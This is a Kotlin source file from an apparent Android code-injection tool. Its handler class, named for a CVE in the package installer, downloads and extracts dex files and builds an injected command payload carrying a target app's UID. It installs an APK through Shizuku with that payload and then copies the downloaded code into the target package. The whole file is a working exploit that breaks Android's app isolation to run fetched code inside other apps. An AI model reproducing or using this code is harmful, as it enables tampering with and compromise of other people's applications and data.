package com.wunelezi.injector.inject

import android.content.Context

class CvePackageInstallerHandler(private val context: Context) : InjectionHandler {

    override fun execute(targetPackage: String, versionSegment: String) {
        val zipFile = runCatching { DexDownloader.downloadDexZip(context, versionSegment) }
            .getOrElse { throw RuntimeException("下载 dex 失败: ${it.message}", it) }

        val dexFiles = runCatching { DexDownloader.extractDexFiles(context, zipFile, versionSegment) }
            .getOrElse { throw RuntimeException("解压 dex 失败: ${it.message}", it) }

        runCatching { DexDownloader.writeToWidgetProvider(context, dexFiles) }
            .getOrElse { throw RuntimeException("写入 WidgetProvider 失败: ${it.message}", it) }

        val apkFile = runCatching { DexDownloader.exportAndCopyApk(context) }
            .getOrElse { throw RuntimeException("导出 APK 失败: ${it.message}", it) }

        val uid = runCatching { context.packageManager.getApplicationInfo(targetPackage, 0).uid }
            .getOrElse { throw RuntimeException("获取目标 UID 失败: ${it.message}", it) }

        val payload = """@null
mcinject $uid 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null""".trimIndent()

        PackageInstallerShizuku.installPackage(apkFile, payload)
            .getOrElse { throw RuntimeException("安装失败: ${it.message}", it) }

        runCatching { DexDownloader.copyDexToTarget(targetPackage, versionSegment) }
            .getOrElse { throw RuntimeException("复制 dex 到目标失败: ${it.message}", it) }
    }
}
